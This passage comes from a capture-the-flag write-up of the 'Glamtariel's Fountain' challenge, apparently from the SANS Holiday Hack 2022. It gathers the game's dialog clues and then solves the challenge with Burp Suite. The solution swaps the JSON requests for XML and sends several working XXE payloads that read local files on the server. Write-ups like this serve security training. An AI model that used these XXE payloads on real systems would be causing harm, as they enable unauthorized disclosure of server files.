<td>I'm glad I wasn't around for any of the early age scuffles. I shudder just thinking about the stories.</td>
</tr>
<tr>
<td>Ice Boat</td>
<td>Fountain</td>
<td>Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though.</td>
<td>I pretty much stick to just one TYPE of language, it's a lot easier to share things that way.</td>
</tr>
<tr>
<td>Star</td>
<td>either</td>
<td>O Frostybreath Kelthonial<br>shiny stars grace the night<br>from heavens on high!</td>
<td>Up and far many look<br>away from glaciers cold.<br>To Phenhelos they sing<br>here in Kringle's realm!</td>
</tr>
</tbody>
</table>
<p>Note that when the Green Ring is dropped on the Fountain an eye appears in the middle of the screen which must be clicked to dismiss before anything else can be done.  This has no effect or relevance that I could find on the rest of the challenge.</p>
<p>The second page of dialogs tell us the following</p>
<ul>
<li>Again, we are told that we should look at how the TRAFFIC FLIES.  This must be important.</li>
<li>The princess mentions that she has a green ring in her collection.</li>
<li>Again we are told that a PATH is involved, but this time along with an APP, inferring an application path of some sort.</li>
<li>The fountain can be a poor guide for decisions</li>
<li>The princess can speak in different TYPES of languages</li>
<li>The fountain only uses one TYPE of language</li>
</ul>
<p>After completing this second set of dialogs, you will get the final page of the site with the last set of objects</p>
<ul>
<li>Two Blue Rings</li>
<li>Silver Ring</li>
<li>Red Ring</li>
</ul>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>Blue or Silver Ring</td>
<td>empty space</td>
<td>These are kind of special, please don't drop them just anywhere</td>
<td>These are kind of special, please don't drop them just anywhere</td>
</tr>
<tr>
<td>Red Ring</td>
<td>empty space</td>
<td>This is no small trinket, please don't drop it just anywhere</td>
<td>This is no small trinket, please don't drop it just anywhere</td>
</tr>
<tr>
<td>Blue Ring</td>
<td>Princess</td>
<td>I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty.</td>
<td>If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though.</td>
</tr>
<tr>
<td>Blue Ring</td>
<td>Fountain</td>
<td>I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things.</td>
<td>Glamtariel can be pretty tight lipped about some things.</td>
</tr>
<tr>
<td>Silver Ring</td>
<td>Princess</td>
<td>Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone.</td>
<td>I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that.</td>
</tr>
<tr>
<td>Silver Ring</td>
<td>Fountain</td>
<td>You know what one of my favorite songs is? Silver rings, silver rings ....</td>
<td>Glamtariel may not have one of these silver rings in her collection, but I've overheard her talk about how much she'd like one someday.</td>
</tr>
<tr>
<td>Red Ring</td>
<td>Princess</td>
<td>Ah, the fiery red ring! I'm definitely proud to have one of them in my collection.</td>
<td>I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more.</td>
</tr>
<tr>
<td>Red Ring</td>
<td>Fountain</td>
<td>Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one.</td>
<td>You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently.</td>
</tr>
</tbody>
</table>
<p>From this last set of dialog we learn the following</p>
<ul>
<li>The princes keeps track of her rings in a RINGLIST that uses a SIMPLE FORMAT.</li>
<li>The princess has 2 blue rings</li>
<li>The princess has a red ring</li>
<li>The princess doesn't have a silver ring in here collection, but she wants one.</li>
<li>If we ask the princess about rings using a different TYPE of language, we may be more responsive.</li>
</ul>
<h2 id="solution">Solution</h2>
<p>Starting from one of the first clues, we want to watch the web traffic as we interact with the site.  Stating Burp Suite we learn that every time an object is moved a POST request is sent to the /dropped URL, sending data using the JSON Content Type.</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
    <span class="nt">&quot;imgDrop&quot;</span><span class="p">:</span><span class="s2">&quot;img1&quot;</span><span class="p">,</span>
    <span class="nt">&quot;who&quot;</span><span class="p">:</span><span class="s2">&quot;princess&quot;</span><span class="p">,</span>
    <span class="nt">&quot;reqType&quot;</span><span class="p">:</span><span class="s2">&quot;json&quot;</span>
<span class="p">}</span>
</code></pre></div>
<p>Some experimentation tells us that img1 is the top right object, img2 is the top left, img3 is the bottom right, and img4 is the bottom left.</p>
<p>There was numerous mentions of TYPE in the dialogs, with indications that the princess can understand more than one.  HTML POST requests can format the information submitted using several Content Types, but the most common are JSON and XML.  We see from the data in the POST that it is using JSON, but what if we send the same data using the XML format?</p>
<p>To do this, send the POST request to the Burp repeater, and modify it as follows.</p>
<ul>
<li>Change the Content-Type in the header to application/xml</li>
<li>Change the content to the XML format
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span>img1<span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div></li>
</ul>
<p>Inspecting the response packet we see different dialog from both the princess and the fountain.</p>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>any</td>
<td>princess</td>
<td>I love rings of all colors!</td>
<td>She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.</td>
</tr>
<tr>
<td>any</td>
<td>fountain</td>
<td>I'm one of the few who can discuss anything using that TYPE of language.</td>
<td>Yeah, I can understand a bit, but not communicate with it at all.</td>
</tr>
</tbody>
</table>
<p>The only thing we really learn from this is that the princess understands XML.</p>
<p>Referring back to the hint from Hal Tandybuck, XML External Entity (XXE) Processing seems to be an option.  This technique allows us to reference some external entity in our XML input, such as files on the local system.  We've learned that an APP PATH is involved, and there is a RINGFILE in a SIMPLE FORMAT, so if we can deduce the name of a file we may be able to retrieve it using XXE.</p>
<p>Looking at the web traffic again we see that image files representing the objects on the site that we can interact with are located in the directory <code>/static/images</code>.  If we deduce that the web application is in a directory called APP, and that the file is RINGFILE.TXT, then the local file we want to access is <code>/app/static/images/ringfile.txt</code>.</p>
<p>The following XML will use XXE to send this file to the princess.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/ringlist.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>xxe</td>
<td>princess</td>
<td>Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.</td>
<td>She really does try to keep things safe. Best just to put it away. (click)</td>
</tr>
</tbody>
</table>
<p>In addition to the above dialog, we also have a value in the previously unused 'visit' property, telling us to go to <code>https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png,262px,100px</code>, where we get the following image.  </p>
<p><img alt="" src="../pholder-morethantopsupersecret63842.png" /></p>
<p>This image references two files in the folder <code>x_phial_pholder_2022</code>, <code>bluering.txt</code> and <code>redring.txt</code>.</p>
<p>Next we use XXE to "give" these rings to the princess.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/bluering.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>bluering.txt</td>
<td>princess</td>
<td>I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.</td>
<td>She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.</td>
</tr>
</tbody>
</table>
<p>Note that this is the same dialog from when we dropped a blue ring on the princess though the web UI.  Next, try the red ring.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/redring.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>redring.txt</td>
<td>princess</td>
<td>Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.</td>
<td>Oooooh, I can just tell she'd like to talk about them some more.</td>
</tr>
</tbody>
</table>
<p>Not quite the same dialog as when we dropped the red ring on the princess through the web UI, but the fountain is encouraging us to continue.</p>
<p>Remembering that the princess wants a silver ring, lets see if we can give her one.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/silverring.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>silverring.txt</td>
<td>princess</td>
<td>I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.</td>
<td>Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!</td>
</tr>
</tbody>
</table>
<p>We also now have another value in the 'visit' property, telling us to go to <code>https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px</code>, where we get the following image.</p>
<p><img alt="" src="../redring-supersupersecret928164.png" /></p>
<p>Zooming in on this and rotating it we see the text <code>goldring_to_be_deleted.txt</code>, so we now give that to the princess.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>goldring_to_be_deleted.txt</td>
<td>princess</td>
<td>Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.</td>
<td>She's definitely hiding something.</td>
</tr>
</tbody>
</table>
<p>The princess tells us here that she thought we were going to give her the silver ring.  She also makes reference to a REQ and TYPE.  Noting that reqType is one of the parameters in the POST content, and the silver ring is image #1 on the web page, we create the following XML request.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root[  </span>
<span class="cp">    &lt;!ENTITY xxe SYSTEM &quot;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&quot;&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span>img1<span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>silverring.txt</td>
<td>princess</td>
<td>No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!</td>
<td>Wow, I have never seen that before! She must really trust you!</td>
</tr>
</tbody>
</table>
<p>Along with the above dialog, we get the following URL reference in the 'visit' parameter.
<code>https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px</code></p>
<p><img alt="" src="../goldring-morethansupertopsecret76394734.png" /></p>
<details class="success">
<summary>Answer</summary>
<p><code>goldring-morethansupertopsecret76394734.png</code></p>
</details>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../09_Open_the_Boria_Mine_Door/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Open the Boria Mine Door" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Open the Boria Mine Door
            </div>
          </div>
        </a>
      
      
        
        <a href="../../Recover_the_Cloud_Ring/" class="md-footer__link md-footer__link--next" aria-label="Next: Recover the Cloud Ring" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Recover the Cloud Ring
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.tabs.link", "navigation.indexes"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.e1a181d9.min.js"></script>
      
    
  </body>
</html>